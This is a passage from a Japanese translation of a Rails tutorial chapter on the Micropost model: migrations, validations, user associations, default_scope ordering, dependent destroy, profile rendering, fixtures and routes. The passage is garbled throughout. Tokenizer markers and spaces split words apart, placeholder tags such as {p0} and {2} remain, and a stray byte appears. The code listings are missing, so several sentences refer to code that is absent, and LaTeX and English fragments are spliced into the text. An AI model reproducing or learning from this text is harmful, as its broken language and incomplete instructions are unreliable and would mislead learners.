▁ 実行 した 結果 の Micropost モデルの 構造 は 図 \ ref { fig : micropost _ model } のようになります 。
▁ Micropost データモデル
▁ 図 \ ref { fig : micropost _ model } の モデル では 、 マイクロポストの 投 稿 に \ ko de { String } 型 ではなく \ ko de { text } 型 を使って いる点に注目してください 。 これは 、 ある程度 の 量 の テキスト を 格 納 するときに 使われ る 型 です 。
▁\ ko de { String } 型 でも 2 5 5 文字 まで は 格 納 できる ため 、 この 型 でも \ ref { sec : micropost _ validations } で 実装 する 14 0 文字 制限 を 満 た せる のですが 、\ ko de { T ext } 型 の 方が 表現 豊 か な マイクロポストを 実現 できます 。
▁たとえば 、\ ref { sec : creat ing _ microposts } では 投 稿 フォーム に String 用の テキスト フィールド ではなく て T ext 用の \ emph { テキスト エ リ ア } を使う ため 、 より 自 然 な 投 稿 フォーム が 実現 できます 。
▁また 、\ ko de { T ext } 型 の 方が 将来 における 柔 軟 性 に 富 んで いて 、 たとえば い つ か 国 際 化 を するときに 、 言語 に応じて 投 稿 の 長さ を 調 節 することもできます 。
▁ では 、 リスト \ ref { code : generate _ user _ model } で User モデル を生成し たとき と同様に 、 Rails の \ ko de { generate ▁ model } コマンド を使って Micropost モデル を 生成 してみます 。
▁リスト { p 0} で データベースに {2} users {/2} テーブル を 作る マイグレーション ファイルを 生成 した 時 と同様に 、 この {2} generate {/2} コマンド は {2} microposts {/2} テーブル を作成する ための マイグレーション ファイル を生成します ▁( リスト \ ref { code : users _ migration })。
▁ 外部 参 照 キー 参 照 は 、 データベース レベル で の 制 約 です 。 これ によって 、 Microposts テーブル の user _ id は 、 Users テーブル の id カラム を参照 する ようになります 。
▁ 本チュートリアルで こ の詳細 が 重要 になる ことはありません 。 また 、 この 外部キー による 制 約 は 、 すべての データベース で 使 え る わけではありません
▁( たとえば Heroku の PostgreSQL では サポート されています が 、 開発 用の SQLite では サポート されていません )。
▁ 外部キー の詳細 は \ ref { sec : relationship _ user _ association s } で 学 び ます 。
▁User モデル のとき と同じ で 、 Micropost モデルの マイグレーション ファイル でも \ ko de { t . timestamp s } という 行 ▁( マ ジ ッ ク カラム ) ▁ が自動的に 生成 されています 。 これにより 、 ▁\ ref { sec : database _ migration s } で 説明したように \ ko de { created \_ at } と \ ko de { updated \_ at } という カラム が追加され ます ▁( 図 ▁\ ref { fig : micropost _ model })。
▁なお 、\ ko de { created _ at } カラム は 、\ ref { sec : order ing _ and _ dependency } や \ ref { sec : render ing _ microposts } の実装 を 進め て い く 上で 必要な カラム です 。
▁ インデックス が 付 与 された Micropost の マイグレーション
▁\ ko de { user \_ id } と \ ko de { created \_ at } 両方 の カラム を 1 つの 配列 に含め ること で 、 Active ▁Record で \ emph { 両方 } の キー を 同時に 使用する \ emph { 複 合 キー インデックス } を作成 できます 。
▁それでは 、 リスト \ ref { code : micropost _ migration } を マイグレーション 使って 、 いつものように データベース を更新し てみましょう 。
▁ 基本的な モデル を作成し たので 、 次に 要求 される 制限 を 実現 するための バリデーション を追加しましょう 。
▁ Micropost モデル を作成 したときに 、 マイクロポスト は 投 稿 した ユーザーの id ▁( user _ id ) ▁ を 持 た せる ように しました 。
▁これ を使って 、 慣習 的に 正しく Active ▁Record の \ emph { 関連付け } を 実装 していきます ▁(\ ref { sec : user _ micropost _ association s }) ▁ が 、 まず は \ ko de { Micropost } モデル 単 体 を ▁( テスト駆動開発 で ) ▁ 動く ように してみます 。
▁ Micropost の 初期 テストは User モデルの 初期 テスト ▁( リスト \ ref { code : name _ presence _ test }) ▁ と似ています 。
▁まずは \ ko de { setup } の ステップ で 、 fixture の サンプル ユーザー と 紐 付け た 新しいマイクロポスト を作成 しています 。 次に 、 作成した マイクロポスト が 有効 かどうかをチェックし て ます 。
▁最後に 、 あらゆる マイクロポスト は ユーザーの id を 持 っている べ き なので 、\ ko de { user \_ id } の 存在性 のバリデーション に対するテスト も 追加 します 。
▁これらの 要素 を 1 つ に まとめ ると 、 リスト \ ref { code : micropost _ valid ity _ test } のような テストコード になります 。
▁ 新しい Micropost の 有効 性 に対するテスト
▁# ▁このコードは 慣 用 的な 意味 で 正しく ない 。
▁\ ko de { setup } メソッド の中で コメント している とおり 、 マイクロポスト を作成する コードは 動 きます が 、 慣習 的に は 正しく ありません ▁(\ ref { sec : user _ micropost _ association s } で 修正 します )。
▁これ を修正する ためには 、 ユーザー id に対する バリデーション を 追加する必要があります ▁( リスト \ ref { code : micropost _ user _ id _ validation })。
▁なお 、 リスト { p 0} には す で に {2} belongs _ to {/2} という コード があります が 、 これはリスト \ ref { code : micropost _ migration } の マイグレーション によって自動的に 生成された コード です 。
▁この 行 の 意味 については 、\ ref { sec : user _ micropost _ association s } で説明します 。
▁ マイクロポストの \ ko de { user \_ id } に対する 検証
▁これにより 、 モデルの テストは \ passing する ようになります 。
▁次に 、 マイクロポストの \ ko de { content } 属性 に対する バリデーション を追加しましょう ▁(\ ref { sec : put t ing _ the _ m i c r o _ in _ microposts } で紹介した 例 と同じ です )。
▁\ ko de { user _ id } 属性 と同様に 、\ ko de { content } 属性 も 存 在 する必要が あり 、 さらに \ emph { マ イ ク ロ } ポ スト が 14 0 文字 より 長 く な らない よう 制限 を加え ます 。
▁\ ref { sec : user _ validations } で 使 った User モデル のバリデーション を 参 考 に 、 まず は これらの 制限 を 簡潔 に テスト してみます 。 結果 は リスト \ ref { code : micropost _ validations _ tests } の とおりです 。
▁ Micropost モデル のバリデーション に対するテスト
▁\ ref { sec : user _ validations } と同様 で 、 リスト \ ref { code : micropost _ validations _ tests } では マイクロポストの 長さ をテストする ために 、 文字列 の 乗 算 を使用しています 。
▁=> ▁" a a a a a a a a a a "
▁a a a a a a a a a a a a a a a a a a a a a a a a a a a a a a a a a a a a a a a a a "
▁これ に対応する アプリケーション 側 の実装 は 、 User の \ ko de { name } 用 バリデーション ▁( リスト \ ref { code : length _ validation }) ▁ と 全 く 同じです 。 リスト \ ref { code : micropost _ validations } に 結果 を示します 。
▁ Micropost モデル のバリデーション
▁Web アプリケーション 用の データモデル を 構 築 する に あ た って 、 個 々 の モデル 間 で の \ emph { 関連付け } を 十分 考え ておく ことが 重要です 。
▁ 今回の 場合は 、 ▁\ ref { sec : demo _ user _ has _ many _ microposts } でも 示 した ように 、 それぞれの マイクロポスト は 1 人のユーザー と 関連付け られ 、 それぞれの ユーザー は ▁( 潜 在 的に ) ▁ 複数の マイクロポスト と 関連付け られます 。 この 関連付けを 図 \ ref { fig : micropost _ belongs _ to _ user } と 図 \ ref { fig : user _ has _ many _ microposts } に示します 。
▁これらの 関連付け を実装する ための 一 環 として 、 Micropost モデル に対するテスト を作成し 、 さらに User モデルに いくつかの テスト を追加します 。
▁ } Micropost と その User は ▁\ ko de { belongs \_ to } ▁( 1 対 1 ) ▁ の関係 性 がある
▁User と その Micropost は ▁\ ko de { has \_ many } ▁( 1 対 多 ) ▁ の関係 性 がある
▁ この節 で 定義 する \ ko de { belongs \_ to } / \ ko de { has \_ many } 関連付け を使用することで 、 表 \ ref { table : association _ method s } に 示す ような メソッドを Rails で 使えるようになります 。
▁ 表 \ ref { table : association _ method s } では 、 以下の メソッド ではなく
▁これらの メソッドは 使う と 、 紐 付 い ている ユーザーを \ emph { 通 して } マイクロポスト を作成する ことができます ▁( 慣習 的に 正しい 方法 です )。
▁ 新 規 の マイクロポスト が この 方法で 作成される 場合 、\ ko de { user \_ id } は自動的に 正しい 値 に 設定 されます 。
▁この 方法 を使うと 、 たとえば 以下のような
▁という 書き 方 ▁( リスト \ ref { code : micropost _ valid ity _ test }) ▁ が 、 以下のように 書き 換 え られます 。
▁(\ ko de { new } メソッド と同様に 、\ ko de { build } メソッドは オブジェクト を返します が データベースに は 反 映 されません 。 )
▁ 一度 正しい 関連付け を定義し て し ま えば 、\ ko de {@ micropost } 変数 の \ ko de { user \_ id } には 、 関連する ユーザーの id が自動的に 設定 されます 。
▁ Micropost に 紐 付 いた User オブジェクト を返す
▁User の マイクロポストの 集合 を か え す
▁\ ko de { user } に 紐 付 いた マイクロポスト を作成する
▁\ ko de { user } に 紐 付 いた マイクロポスト を作成する ▁( 失敗 時に 例外を発生 )
▁\ ko de { user } に 紐 付 いた 新しい Micropost オブジェクト を返す
▁\ ko de { user } に 紐 付 いて いて 、\ ko de { id } が \ ko de {1} である マイクロポスト を検索する
▁ user / micropost 関連 メソッドの まとめ
▁\ ko de {@ user . microposts . build } のような コード を使う ためには 、 ▁User モデルと Micropost モデル を それぞれ 更新 して 、 関連付け る必要があります 。
▁ Micropost モデルの 方 では 、\ ko de { belongs \_ to ▁: user } という コードが 必要 になる のですが 、 これは ▁リスト \ ref { code : micropost _ belongs _ to _ user } の マイグレーション によって自動的に 生成 されている はずです ▁( リスト \ ref { code : micropost _ belongs _ to _ user })。
▁ マイクロポスト が ユーザーに 所 属 する ▁(\ ko de { belongs \_ to }) ▁ 関連付け
▁ ユーザーが マイクロポストを 複 数 所 有 する ▁(\ ko de { has \_ many }) ▁ 関連付け
▁ 正しく 関連付け が できた ら 、 リスト \ ref { code : micropost _ valid ity _ test } の \ ko de { setup } メソッドを 修正 して 、 慣習 的に 正しく マイクロポスト を作成 してみます ▁( リスト \ ref { code : micropost _ valid ity _ test _ id io ma tic })。
▁ 慣習 的に 正しく マイクロポスト を作成する
▁もちろん 、 些 細 な リファクタリング で しか ないので 、 テストは \ passing した ま ま になっている はずです 。
▁この 項 では 、 User と Micropost の 関連付けを 改良 していきます 。
▁ 具体的には 、 ユーザーの マイクロポストを 特定の \ emph { 順序 } で 取得 できるように したり 、 マイクロポストを ユーザーに \ emph { 依 存 させ て } 、 ユーザーが 削除 された ら マイクロポスト も 自動的に 削除 される ように していきます 。
▁ デフォルトの スコープ
▁\ ko de { user . microposts } メソッドは デフォルトで は 読み出し の 順序 に対して 何も 保 証 しません が 、 ▁ ブログ や Twitter の 慣習 に従って 、 作成 時間 の 逆 順 、 つまり 最も 新しいマイクロポスト を 最初に 表示する ように してみましょう
▁ユーザー 一覧 を実装する とき も ▁(\ ref { sec : updating _ and _ de let ing _ users _ co nclusion }) 、 似 た ような 問題 に ぶ つ か り ました 。
▁これ を実装する ためには 、\ emph { default ▁ scope } という テクニック を使います 。
▁この 機能 のテスト は 、 見 せ かけ の 成功 に 陥 り やすい 部分 で 、「 アプリケーション 側 の実装 が 本 当 は 間 違 っている の に テストが 成功 してしまう 」 という 罠 があります 。 正しい テストを書く ために 、 ここでは テスト駆動開発 で 進め ていきます 。
▁ 具体的には 、 まず データベース 上の 最初の マイクロポスト が 、 fixture 内の マイクロポスト ▁(\ ko de { m o st \_ re c ent }) ▁ と同じ である か 検証 する テストを 書い て い き ましょう ▁( リスト \ ref { code : micropost _ order _ test })。
▁ マイクロポストの 順序 付け をテストする
▁リスト \ ref { code : micropost _ order _ test } では 、 マイクロポスト 用の fixture ファイル から サンプルデータ を 読み出し ている ので 、 次の fixture ファイル も 必要 になります ▁( リスト \ ref { code : micropost _ fixtures })。
▁ マイクロポスト 用の fixture
▁ここでは 、 埋め込み Ruby を使って \ ko de { created \_ at } カラム に 明示的に 値を セット して いる点に注目してください 。
▁この マ ジ ッ ク カラム は Rails によって自動的に 更新 される ため 、 基本的に は 手動で 更新 すること は できない のですが 、 fixture ファイル の中で は それ が 可能 になっています 。
▁また 、 原 理 的に は 必要 は ない かもしれませんが 、 ほとんど の システム では 上 から 順に 作成される ので 、 fixture ファイル でも 意 図 的に 順序 を い じ っています 。
▁たとえば 、 ファイル 内の 一 番 下 の サンプルデータ は 最後に 生成される ので 、 最も 新しい 投 稿 になる ように 修正 する 、 といった 感 じ です 。 ただ 、 この 振る舞い は 恐 ら く システム に 依 存 して いて 崩 れ やすい ので 、 ( 本 来 は ) ▁この 振る舞い に 依 存 した テストは 書く べ き では 無 い でしょう 。
▁このコードは リスト \ ref { code : micropost _ order _ test } で使用されていま した 。 もうひとつ 、
▁次に 、 Rails の \ ko de { default \_ scope } メソッドを使って この テストを 成功 させ ます 。 このメソッドは 、 データベースから 要素 を取得し たとき の 、 デフォルトの 順序 を指定する メソッド です 。
▁ 特定の 順序 に したい場合は 、\ ko de { default \_ scope } の 引数に \ ko de { order } を 与え ます 。 たとえば 、\ ko de { created \_ at } カラム の 順に したい場合は 次の ようになります 。
▁ 順序 を 逆 に したい場合は 、 一 段 階 低 い レベル の 技術 では あります が 、 次のように 生 の SQL を 引数に 与え る必要があります 。
▁ SQL は 大文字 小文字 を 区別 しません が 、 慣習 的に SQL の キーワード ▁( ▁\ ko de { D E S C } など ) ▁ は 大文字 で 書くこと になっています 。
▁ 古 い バージョンの Rails では 、 欲 しい 振る舞い に するために は 生 の SQL を 書く しか 選択 肢 が なかった のですが 、 Rails ▁4.0 から は 次のように Ruby の 文法 でも 書 け る ようになりました 。
▁ このコード を使って Micropost モデル を更新し た 結果を 、 リスト \ ref { code : micropost _ order ing } に示します 。
▁\ ko de { default \_ scope } で で マイクロポストを 順序 付け る
▁リスト \ ref { code : micropost _ order ing } では 新 た に 、 ラ ム ダ 式 ▁( S t a b by ▁ la m b d a ) ▁という 文法 を使っています 。 これは 、\ emph { Proc } や \ emph { la m b d a } ▁( も しく は \ emph { 無 名 関数 }) と呼ばれる オブジェクト を作成する 文法 です 。
▁\ ko de { - > } という ラ ム ダ 式 は 、 ブロック ▁(\ ref { sec : block s }) ▁ を 引数に 取り 、 Proc オブジェクト を返します 。 この オブジェクトは 、\ ko de { c all } メソッドが 呼ばれ たとき 、 ブロック 内の 処理 を 評価 します 。
▁この 構 文 を コンソール で 確かめ てみましょう 。
▁=> ▁#< Proc : 0 x 00 7 fa b 9 3 8 d 0 10 8 @ ( i rb ) : 1 ▁( la m b d a ) >
▁( Proc や Ruby の トピック として は や や 高度な 部 類 に含まれる ので 、 今 すぐ わ から なくても 心 配 する必要はありません 。 )
▁リスト \ ref { code : micropost _ order ing } のコード を追加する ことで 、 テストスイート は ▁\ passing ▁ になるはずです 。
▁D e p end ent : ▁ destroy
▁ 順序 については ひ と まず ここで 区切 ること に し 、 今度は マイクロポスト に 第 二 の 要素 を追加し てみましょう 。
▁\ ref { sec : de let ing _ users } で 書いた ように 、 サイト 管理者 は ユーザーを \ emph { 破 棄 する } 権限 を 持 ち ます 。
▁ ユーザーが 破 棄 された 場合 、 ユーザーの マイクロポスト も同様に 破 棄 される べ き です 。
▁この 振る舞い は 、\ ko de { has \_ many } メソッド に オプション を渡して あ げ ること で 実装 できます ▁( リスト \ ref { code : micropost _ dependency })。
▁ マイクロポスト は 、 その 所 有 � 者 ▁( ユーザー ) ▁ と 一 緒 に 破 棄 される ことを 保 証 する
▁\ ko de { dependent : ▁: destroy } という オプション を使うと 、 ユーザーが 削除 された ときに 、 その ユーザーに 紐 付 いた ▁( その ユーザーが 投 稿 した ) ▁ マイクロポスト も 一 緒 に 削除 される ようになります 。
▁これは 、 管理者 が システム から ユーザーを削除 した とき 、 持 ち 主 の 存在しない マイクロポスト が データベースに 取り 残 され てしまう 問題 を 防 ぎ ます 。
▁次に 、 リスト \ ref { code : micropost _ dependency } が正しく 動く かどうか 、 テスト を使って User モデル を 検証 してみます 。
▁この テストでは 、 ▁( id を 紐 づ け るため の ) ▁ユーザー を作成する こと と 、 その ユーザーに 紐 付 いた マイクロポストを 作成する必要があります 。
▁ その後 、 ユーザーを削除 して み て 、 マイクロポストの 数 が 1 つ 減 っている かどうかを確認 します 。
▁作成した コードをリスト \ ref { code : dependent _ destroy _ test } に示します
▁( [ delete ] ▁ リンク の 統合テスト ▁( リスト \ ref { code : delete _ link _ integration _ test }) ▁ と 比 較 してみてください 。 )
▁\ ko de { dependent : ▁: destroy } のテスト
▁リスト \ ref { code : micropost _ dependency } のコード が正しく 動 い ていれば 、 テストが ▁\ passing ▁ する ようになります 。
▁Web 経由で マイクロポスト を作成する 方法は 現時点では ありません が ▁(\ ref { sec : creat ing _ microposts } から 作り 始 め ます ) 、 マイクロポスト を表示する こと と 、 テスト すること なら できます 。
▁ここでは 、 Twitter のような 独 立 した マイクロポストの \ ko de { index } ページ は 作 らず に 、 図 \ ref { fig : user _ microposts _ mockup } のモックアップ に示したように 、 ユーザーの \ ko de { show } ページ で 直接 マイクロポストを 表示 させる ことにします 。
▁ユーザー プロフィール に マイクロポストを 表示 させる ため 、 最初に 極めて シンプルな ER b テンプレート を作成します 。 次に 、\ ref { sec : sample _ users } の サンプルデータ 生成 タスク に マイクロポストの サンプル を追加して 、 画面 に サンプルデータ が表示される ように してみます 。
▁ マイクロポスト が表示され た プロフィール ページのモックアップ
▁\ label { fig : user _ microposts _ mockup } }< n >\ end { figure }< n >< n > ▁\ subsection { マイクロポストの 描画 } ▁% ▁( fold )< n > ▁\ label { sec : render ing _ microposts }< n >< n > O ur ▁ p la n ▁is ▁to ▁d is p la y ▁the
▁ とは い え 、 今回 必要となる ア イ デ ア の ほとんど は 、\ ref { sec : show ing _ all _ users } で 実装 した ユーザー を表示する 部分 と似ています 。
▁まずは 、 Micropost の コントローラ と ビュー を作成する ために 、 コントローラ を生成し ましょう ▁( 今回 必要な のは ビュー だけで 、 Microposts コントローラ は \ ref { sec : ma n ip ul at ing _ microposts } まで 使い ません )。
▁ 今回の 目的 は 、 ユーザー 毎 に すべての マイクロポストを 描画 できるように することです 。
▁\ ref { sec : partial _ refactoring } で 見 た 次の コード では 、
▁まずは 、 順序 無 し リスト の ▁\ emph { ul } タグ ではなく 、\ ko de { 順序 付き } リスト の \ emph { ol } タグ を使って いる点に注目してください 。 これは 、 マイクロポスト が 特定の 順序 ▁( 新しい → 古 い ) ▁ に 依 存 している ためです 。
▁次に 、 対応する パーシャル を リスト \ ref { code : micropost _ partial } に示します 。
▁1 つの マイクロポスト を表示する パーシャル
▁</ span >
▁ここでは \ ko de { time \_ ago \_ in \_ word s } という ヘルパーメソッド を使っています 。 これは メソッド 名 の 表 す とおりです が 、「 3 分 前に 投 稿 」 といった 文字列を 出力 します 。 具 体 的な 効果 について \ ref { sec : sample _ microposts } で説明します 。
▁また 、 リスト \ ref { code : micropost _ partial } では 各 マイクロポスト に対して CSS の id を 割 り 振 っています 。
▁これは 一般的 に 良い と される 慣習 で 、 たとえば 将来 、 JavaScript を使って 各 マイクロポストを 操作 した く な った とき な d に 役 立 ち ます 。
▁ 次 は 、 一度 に すべての マイクロポスト が表示され てしまう 潜 在 的 問題 に 対 処 します 。
▁\ ref { sec : pagination } では ページネーション を 使い ましたが 、 今回 も 同じ 方法で この問題 を 解決 します 。
▁ 前 回 同様 、\ ko de { will \_ paginate } メソッド を使うと 次の ようになります 。
▁リスト \ ref { code : will _ paginate _ index _ view } のユーザー 一覧 画面 のコード と 比 較 すると 、 少し 違 っています 。 。 以前 は 次のように 単純な コード で した 。
▁ 実は 、 上のコード は 引数 な し で 動作 していました 。 これは \ ko de { will \_ paginate } が 、 Users コントローラの コンテキスト において 、\ ko de {@ users } インスタンス変数 が存在し ている ことを \ emph { 前 提 と している } ためです 。 この インスタンス変数 は 、\ ref { sec : pagination } でも 述 べ た ように \ ko de { ActiveRecord :: Re l ation } クラスの インスタンス です 。
▁もちろん 、 そのような 変数 を ユーザー \ ko de { show } アクション で 定義 し なければなりません ▁( リスト \ ref { code : user _ show _ microposts _ instance })。
▁\ ko de {@ microposts } インスタンス変数 を \ ko de { show } アクション に追加する
▁\ ko de { paginate } メソッドの 素 晴 ら し さ に 注目してください 。 \ emph { マイクロポストの 関連付け を経由して } \ text tt { micropost } テーブル に 到 達 し 、 必要な マイクロポストの ページを 引 き 出 してくれます 。
▁ 最後の 課題 は マイクロポストの 投 稿 数 を表示する ことです が 、 これは \ ko de { count } メソッド を使う ことで 解決 できます 。
▁\ ko de { paginate } と同様に 、 関連付けを と お して \ ko de { count } メソッド を呼び出す ことができます 。
▁ 大 事 な ことは 、\ ko de { count } メソッド では データベース 上の マイクロポストを 全 部 読み だ して から 結果 の配列 に対して \ ko de { length } を 呼 ぶ 、 といった 無 駄 な 処理 は \ emph { していない } という 点 です 。 そ ん な ことを した ら 、 マイクロポストの 数 が 増 加 する に つ れ て 効率 が 低 下 し てしまいます 。
▁ そう ではなく 、 ( データベース 内で の 計算 は 高 度 に 最適化 され いる ので ) ▁ データベースに 代わりに 計算 しても ら い 、 特定の \ ko de { user \_ id } に 紐 付 いた マイクロポストの 数 を データベースに 問 い 合わせ ています 。
▁( それ でも count メソッドが アプリケーションの ボ ト ル ネ ッ ク になる ようなこと があれば 、 さらに 高速 な \ href { http :// rails casts . com / e p is odes / 23 - counter - cache - column }{\ emph { counter ▁ cache } } を使う こともできます 。 )
▁これで すべての 要素 が 揃 った ので 、 プロフィール画面 に マイクロポストを 表示 させ てみましょう ▁( リスト \ ref { code : user _ show _ microposts })。
▁( このとき 、 リスト \ ref { code : errors _ partial } と同様に ▁\ ko de { if ▁@ user . microposts . any ?} \ ▁ を使って 、 ユーザーの マイクロポスト が 1 つ も ない場合 には 空 の リスト を 表示 させ ていない 点 にも 注目してください 。 )
▁ マイクロポストを ユーザーの \ ko de { show } ページ ▁( プロフィール画面 ) ▁ に追加する
▁ここで 、 改良 した 新しい プロフィール画面 を ブラウザで 見 てみましょう ▁( 図 \ ref { fig : user _ profile _ no _ microposts }) ▁ を ブラウザで 見 てみましょう
▁ マイクロポスト が 1 つ も ないので は 無 理 も ありません 。
▁ では ここで マイクロポスト を追加しましょう 。
▁ マイクロポスト 用の コード のある ユーザー プロフィール ページ ▁( ただし マイクロポスト がない )
▁\ ref { sec : render ing _ microposts } のユーザー マイクロポストの テンプレート 作成 作業 の 成 果 は 、 何 とも 拍 子 抜 け で した 。
▁\ ref { sec : sample _ users } の サンプルデータ 生成 タスク に マイクロポスト も 追加 して 、 この 情 け ない 状 況 を 修正 しましょう 。
▁\ emph { すべての } ユーザーに マイクロポスト を追加し よう と すると 時間 が 掛 か り 過 ぎ る ので 、\ ko de { t a ke } メソッドを使って 最初の 6 人 だけ に追加します 。
▁ も し このメソッド が 生成 する SQL に 興 味 がある のであれば 、\ ko de { log / development . log } を t a il してみてください ▁( コマンドライン で ファイルに t a il コマンド を実行する という 意味 )。
▁( このとき 、\ ko de { order } メソッドを 経 由 することで 、 明示的に 最初の ▁( ID が 小 さ い 順に ) ▁ 6 人 を呼び出す ようにしています 。 )
▁この 6 人 については 、 1 ページの 表示 限 界 数 ▁( 30 ) ▁ を 越 え させる ために 、 それぞれ 50 個 分 の マイクロポスト を追加する ようにしています 。
▁ これはリスト \ ref { code : sample _ microposts } で使用されていま した 。
▁( リスト \ ref { code : sample _ microposts } の ル ー プ の 順序 に 違 和 感 がある かもしれませんが 、 これは \ ref { sec : the _ status _ feed } で ステータスフィード ▁( い わ ゆ る タ イ ム ラ イン ) ▁ を実装する ときに 役 立 ち ます 。
▁という の も 、 ユーザー 毎 に 50 個 分 の マイクロポストを まとめ て 作成 してしまう と 、 ステータスフィード に 表示される 投 稿 が すべて 同じ ユーザー になってしまい 、 視 覚 的な 見 栄 え が 悪 くなる からです 。 )
▁ サンプルデータ に マイクロポスト を追加する
▁ここで 、 いつものように 開発環境 用の データベース で 再度 サンプルデータ を生成します 。
▁ 生成 し 終わっ たら 、 Rails サーバー を 一度 落 として 、 起動 し 直 してください 。
▁F a k er ▁gem の \ emph { lo re m ▁ ip sum } サンプル テキスト は ランダム に 生成される 仕 様 になっている ため 、 サンプル マイクロポスト の内容 はこの 図 と 違 っている はずです 。
▁ユーザー プロフィール と スタイル の ない マイクロポスト
▁ 図 \ ref { fig : user _ profile _ microposts _ no _ st y l ing } の ページに は マイクロポスト 固有の スタイル が与えられ ていない ので 、 リスト \ ref { code : micropost _ css } を追加して 、 結果 の ページ を見てみましょう
▁ 便 宜 上 、 リスト \ ref { code : micropost _ css } は この章 で 必要な CSS を \ emph { すべて } 含 んで います 。
▁ マイクロポスト 用の CSS ▁( 本 章 で 利用 する CSS の すべて )
▁ 図 \ ref { fig : user _ profile _ with _ microposts } では 最初の ユーザーの プロフィール画面 を 、 図 \ ref { fig : other _ profile _ with _ microposts } では 2 番目の ユーザーの プロフィール画面 を表示し ています 。
▁ 最後の 図 \ ref { fig : user _ profile _ microposts } では 、 最初の ユーザーの \ emph { 2 番 目 } の ページ と 、 下 部 にある ページネーション の リンクを 表示 しています 。
▁ 各 マイクロポストの 表示 には 、 3 つの どの 場合に も 、 それ が作成され て から の 時間 ▁( " 1 分 ​ ​ 前に 投 稿 " ▁ など ) ▁ が表示され ていることに注目してください 。 これはリスト \ ref { code : micropost _ partial } の \ ko de { time \_ ago \_ in \_ word s } メソッド による ものです 。
▁ 数 分 待 って から ページを 再度 読み込む と 、 この テキスト は自動的に 新しい 時間 に基づいて 更新 されます 。
▁{0} 図 11 . 7 {/0} ▁{1} ユーザー プロフィール ▁(\ href { http :// localhost :3000/ users /1 }{/ users /1 }) ▁ と マイクロポスト {/1}
▁{0} 図 11 . 8 {/0} ▁{1} 別 ユーザーの プロフィール と マイクロポスト ▁(\ href { http :// localhost :3000/ users / 5 }{/ users / 5 }) {/1}
▁ アカウント を 有効化 した ば か り のユーザー は プロフィール画面 に リダイレクト される ので 、 その プロフィール画面 が正しく 描画 されている ことは 、 単 体 テスト を通して 確認 済み です ▁( リスト \ ref { code : signup _ with _ account _ activation _ test })。
▁この 項 では 、 プロフィール画面 で 表示される マイクロポスト に対して 、 統合テスト を 書い ていきます 。
▁まずは 、 プロフィール画面 用の 統合テスト を生成し てみましょう 。
▁ プロフィール画面 における マイクロポスト をテストする ためには 、 ユーザーに 紐 付 いた マイクロポストの テスト 用 データ が 必要 になります 。
▁Rails の 慣習 に従って 、 関連付け された テスト データを fixture ファイル に追加する と 、 次の ようになります 。
▁\ ko de { user } に \ ko de { michael } という 値を 渡す と 、 Rails は fixture ファイル 内の 対応する ユーザー を探し 出 して 、 ( も し 見つか れば ) ▁ マイクロポスト に 関連付け て く れ ます 。
▁また 、 マイクロポストの ページネーション をテストする ためには 、 マイクロポスト 用の fixture に いくつか テスト データを 追加する必要があります が 、 これはリスト \ ref { code : users _ fixtures _ ext r a _ users } で ユーザー を追加した とき と同様に 、 埋め込み Ruby を使うと 簡単 です 。
▁これらの コードを 1 つ に まとめ ると 、 マイクロポスト 用の fixture ファイルは リスト \ ref { code : updated _ micropost _ fixtures } のようになります 。
▁ユーザー と 関連付け された マイクロポストの fixture
▁ テスト データ の 準備 は 完了 した ので 、 これ から テストを 書い ていきます が 、 今回の テストは や や 単 純 です 。 今回の テストでは 、 プロフィール画面 にアクセス した 後に 、 ページ タイトル と ユーザー名 、 Gravatar 、 マイクロポストの 投 稿 数 、 そして ページ 分割 された マイクロポスト 、 といった 順 で テスト していきます 。
▁作成した コードをリスト \ ref { code : user _ profile _ test } に示します
▁( Application ヘルパー を インクルード することで 、 リスト \ ref { code : title _ helper } の \ ko de { full \_ title } ヘルパー が 利用 でき て いる点に注目してください )。
▁ も し \ ko de { full \_ title } ヘルパー を使って 他の テスト も リファクタリング した く な った ら ▁( 例 えば リスト \ ref { code : base _ title _ test } など ) 、\ ko de { test \_ helper . rb } から Application ヘルパー を インクルード してください 。
▁User プロフィール画面 に対するテスト
▁リスト \ ref { code : user _ profile _ test } では マイクロポストの 投 稿 数 をチェックする ために 、\ ko de { {1} 第 10 章 {/1} } の 演習 ( \ ref { cha : account _ activation _ and _ password _ reset }) で紹介した { 4 } response . body {/4} を使っています 。
▁ 名前 を見ると 誤 解 され が ち ですが 、\ ko de { response . body } には その ページの 完全な HTML が 含まれています ▁( HTML の body タグ だけで は な ありません )。
▁ したがって 、 その ページの \ emph { ど こ か し ら に } マイクロポストの 投 稿 数 が存在する のであれば 、 次のように 探 し 出 して マッチ できる はずです 。
▁これは \ ko de { assert \_ select } よりも ず っ と 抽 象 的な メソッド です 。 特に 、 ▁\ ko de { assert \_ select } では どの HTML タグ を 探 す のか 伝 え る必要があります が 、\ ko de { assert \_ match } メソッド では その 必要 がない 点が 違 います 。
▁この ように 書くこと で 、\ ko de { h 1 } タグ ▁( ト ッ プ レベル の 見 出 し ) ▁ の \ emph { 内 側 にある }、\ ko de { gravatar } クラス 付き の \ ko de { im g } タグ がある かどうかを チェック できます 。
▁ そして 、 アプリケーション 側 のコードは 実装 済み なので 、 これらの テストは \ passing するはずです 。
▁ データ モデリング と マイクロポスト 表示 テンプレート の 両方 が 完成 した ので 、 次 は Web 経由で それら を作成する ための インターフェイス に 取り か か り ましょう 。
▁この節では 、\ emph { ステータスフィード } ▁( 第 \ ref { cha : following _ users } 章 で 完成 させ ます ) ▁ の最初の ヒント を お 見 せ します 。
▁最後に 、 ユーザーが マイクロポストを Web 経由で 破 棄 できるようにします 。
▁ 従来 の Rails 開発 の 慣習 と 異なる 箇所 が 1 つ あります 。 Microposts リソース への インターフェイス は 、 主 に Pro file ページ と Home ページの コントローラ を経由して 実行される ので 、 Microposts コントローラ には \ ko de { new } や \ ko de { edit } のような アクション は 不 要 という ことになります 。 \ ko de { create } と \ ko de { destroy } があれば 十分 です 。
▁ したがって 、 Microposts の リソース は リスト \ ref { code : microposts _ resource } のようになります 。
▁その 結果 、 リスト \ ref { code : microposts _ resource } のコードは 、 フル セット の ルーティング ▁( 表 \ ref { table : RESTful _ microposts }) ▁ の サブ セット である RESTful ルート ▁( 表 \ ref { table : demo _ RESTful _ microposts }) ▁ になります 。
▁もちろん 、 シ ン プ ル になった ということ は 完成 度 が \ emph { さらに } 高 ま った ということ の 証 し であり 、 退 化 した わけではありません 。 \ ref { cha : a _ toy _ app } で scaffold に 頼 り き り だ った 頃 から ここに 至 る まで は 長 い 道 の り で した が 、 今 では scaffold が 生成 する ような 複雑な コードは ほとんど 不 要 に なりました 。
▁ マイクロポスト リソース の ルーティング
▁ Microposts リソース が提供する リスト \ ref { code : microposts _ resource } の RESTful ルート
